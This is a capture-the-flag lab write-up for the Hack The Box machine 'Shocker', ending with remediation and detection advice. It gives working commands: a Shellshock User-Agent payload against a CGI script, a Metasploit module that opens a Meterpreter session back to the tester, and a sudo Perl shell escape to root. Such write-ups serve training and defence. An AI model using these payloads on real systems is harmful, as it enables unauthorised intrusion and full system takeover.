HACK THE BOX / LINUX / EASY / RETIRED

Shocker

Shellshock in CGI → shelly → sudo Perl → root

Dylan Senez · d4rkgunn3r · Public report

Source and reproduction

Edited from my retained Notion assessment notes. Commands are arranged into a complete sequence; addresses are the original lab values and must match your instance. Output excerpts are recorded evidence, not a new execution or independent retest. Instance flags and recovered secrets are omitted.

01 / Assessment summary

The retained assessment records HTTP command execution as shelly, a Metasploit session, user proof, and a root shell through sudo /usr/bin/perl. The test ran across November 30–December 1, 2025. The two exploitable weaknesses are Shellshock in the CGI execution path and an overly broad sudo permission.

02 / Reconnaissance

The full TCP scan found HTTP on port 80 and SSH on port 2222. The original notes identify Apache 2.4.18 and OpenSSH 7.2p2. The successful CGI target is /cgi-bin/user.sh. The original directory-discovery command was not retained; the known endpoint can be checked directly.

nmap -sV -sC -p- 10.129.22.186 -T4 --min-rate 5000
curl -i http://10.129.22.186/cgi-bin/user.sh

03 / Validate command execution

A CGI request can place the User-Agent value into the process environment. On a vulnerable Bash execution path, the crafted function definition is followed by a command. Two empty echoes separate the CGI headers from the command output.

curl -i -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id' \
  http://10.129.22.186/cgi-bin/user.sh

Recorded output:

HTTP/1.1 200 OK
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/x-sh

uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

04 / Obtain a session

Use the recorded Metasploit module and endpoint. Replace 10.10.14.10 with the address reachable from the target, normally your HTB VPN interface. The module and its payload must be compatible with Linux. Review show options before running; the original notes did not pin a Metasploit version or payload name.

msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 10.129.22.186
set TARGETURI /cgi-bin/user.sh
set LHOST 10.10.14.10
show options
run

The retained output records a Meterpreter session opening from the target. In Meterpreter, use shell to obtain the operating-system command shell for the following commands. This explicit transition makes the original abbreviated transcript usable.

shell
whoami
cat /home/shelly/user.txt
sudo -l

05 / Escalate with sudo Perl

The notes record passwordless permission to run /usr/bin/perl. Perl can replace its process with a shell; when started through sudo, that shell retains root privileges. Execute this in the target command shell, not at the Metasploit console.

sudo /usr/bin/perl -e 'exec "/bin/sh";'
whoami
id
cat /root/root.txt

The recorded whoami result is root; both user and root proof values were captured in the original session and are omitted here.

06 / Remediation and detection

Patch Bash and remove unused CGI handlers. Restrict the service to the functionality it actually needs. Remove general-purpose interpreters from passwordless sudo rules; use a narrowly scoped, root-owned utility if a privileged task is required.

Review HTTP logs for function-definition syntax in headers and correlate CGI requests with unexpected child shells. Audit sudo execution of Perl and other interpreters. These are detection opportunities, not detections validated during this assessment.

07 / Reproduction checklist

Required: the assigned target, reachable HTTP, Metasploit, and a target-reachable callback address. Validate id over HTTP, establish the session, check the sudo rule, execute Perl, and verify root identity. If the callback fails, verify LHOST and listener routing before treating the HTTP proof as a failure. No custom exploit file is required.
